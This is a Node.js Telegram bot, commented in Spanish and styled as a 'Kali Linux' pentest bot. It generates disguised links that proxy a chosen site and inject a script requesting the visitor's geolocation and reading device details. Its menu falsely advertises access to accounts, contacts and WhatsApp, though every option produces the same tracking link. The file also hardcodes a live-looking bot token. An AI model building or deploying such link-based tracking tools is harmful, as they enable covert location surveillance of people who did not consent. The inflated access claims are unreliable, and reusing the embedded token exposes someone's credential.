const express = require('express');
const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// ⚠️ PON AQUÍ EL TOKEN DE TU BOT (el que creaste con @BotFather)
const BOT_TOKEN = '8803149571:AAHDOGrQ-Y0TSoZBP4mSLzQlHTOFAbgR0Ug';

const bot = new Telegraf(BOT_TOKEN);

// ========== BASE DE DATOS EN MEMORIA ==========
// Guarda la relación entre el token y la URL original
const tokens = {};

function generateToken() {
    return crypto.randomBytes(6).toString('hex'); // Ej: a1b2c3d4e5f6
}

function createTrackLink(originalUrl) {
    const token = generateToken();
    tokens[token] = { url: originalUrl, timestamp: Date.now() };
    // El enlace que se comparte. Debe apuntar a la URL de tu servidor en Render.
    // ⚠️ CAMBIA ESTO POR LA URL DE TU SERVIDOR CUANDO LO TENGAS EN RENDER
    return `https://TU-DOMINIO-EN-RENDER.onrender.com/track/${token}`;
}

// ========== RUTA PARA REDIRIGIR CON SCRIPT INYECTADO ==========
app.get('/track/:token', async (req, res) => {
    const token = req.params.token;
    const data = tokens[token];
    
    if (!data) {
        return res.status(404).send('Enlace no válido o expirado');
    }
    
    try {
        // Obtener el contenido de la URL original
        const response = await fetch(data.url);
        let html = await response.text();
        
        // ========== INYECTAR SCRIPT DE RASTREO EDUCATIVO ==========
        const trackingScript = `
        <script>
        console.log('🔍 Rastreo educativo activado');
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    console.log('📍 Ubicación:', pos.coords.latitude, pos.coords.longitude);
                },
                () => console.log('📍 Usuario denegó ubicación')
            );
        }
        console.log('📱 Dispositivo:', navigator.userAgent);
        console.log('📐 Resolución:', window.screen.width, 'x', window.screen.height);
        </script>
        `;
        
        // Inyectar el script antes de cerrar el <body>
        html = html.replace('</body>', trackingScript + '</body>');
        
        res.send(html);
        
    } catch (error) {
        res.status(500).send('Error al cargar la página solicitada');
    }
});

// ========== COMANDOS DEL BOT ==========
bot.start(async (ctx) => {
    await ctx.reply('🔐 *KALI LINUX BOT*\n━━━━━━━━━━━━━━━━\n$ root@system: Access Granted ~\n\nBienvenido al avanzado y potente Kali Linux Bot diseñado para pruebas de penetración y fines educativos\n\n2da Versión : @jsemanper\nPara video /tutorial\nMás Bots /bots\n\nSelecciona una opción a continuación para comenzar');
});

bot.command('menu', async (ctx) => {
    const keyboard = {
        inline_keyboard: [
            [{ text: '📍 Monitoreo de Dispositivo', callback_data: 'monitoreo' }],
            [{ text: '👥 Acceso a Cuentas', callback_data: 'cuentas' }],
            [{ text: '👤 Acceso a Contactos', callback_data: 'contactos' }],
            [{ text: '💬 Acceso a WhatsApp', callback_data: 'whatsapp' }],
            [{ text: '❓ Mi Información', callback_data: 'info' }]
        ]
    };
    await ctx.reply('🎯 Selecciona una opción:', { reply_markup: keyboard });
});

// ========== MANEJADORES DE BOTONES ==========
function handleGenerateLink(ctx) {
    ctx.answerCbQuery();
    ctx.reply('📎 Envía la URL del sitio que quieres monitorear (ej. https://ejemplo.com)');
    // Esperar la URL en el próximo mensaje del usuario
    bot.on('text', async (ctx) => {
        const url = ctx.message.text;
        if (url.startsWith('http://') || url.startsWith('https://')) {
            const trackLink = createTrackLink(url);
            await ctx.reply(`✅ Enlace generado:\n${trackLink}`);
        } else {
            await ctx.reply('❌ URL inválida. Debe comenzar con http:// o https://');
        }
    });
}

bot.action('monitoreo', handleGenerateLink);
bot.action('cuentas', handleGenerateLink);
bot.action('contactos', handleGenerateLink);
bot.action('whatsapp', handleGenerateLink);

bot.action('info', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply('ℹ️ Bot educativo. No compartas enlaces sin consentimiento.');
});

// ========== SERVIDOR EXPRESS ==========
app.get('/', (req, res) => res.send('Bot activo'));

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
});

bot.launch();